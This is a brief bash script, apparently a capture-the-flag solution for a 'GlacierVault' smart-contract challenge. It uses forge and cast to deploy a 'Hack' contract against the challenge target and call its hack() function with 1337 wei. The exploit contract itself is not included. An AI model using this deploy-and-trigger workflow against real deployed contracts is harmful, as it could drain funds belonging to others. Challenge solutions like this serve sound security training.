#!/bin/bash

export RPC=""
export SETUP=""
export PK=""


TARGET=$(cast call $SETUP "TARGET()(address)" --rpc-url $RPC) 
output=$(forge create src/GlacierVault/Guardian.sol:Hack --constructor-args $TARGET --rpc-url $RPC --private-key $PK)

deployed_to=$(echo "$output" | grep "Deployed to" | awk '{print $3}')

cast send "$deployed_to" "hack()" --value 1337 --rpc-url $RPC --private-key $PK 

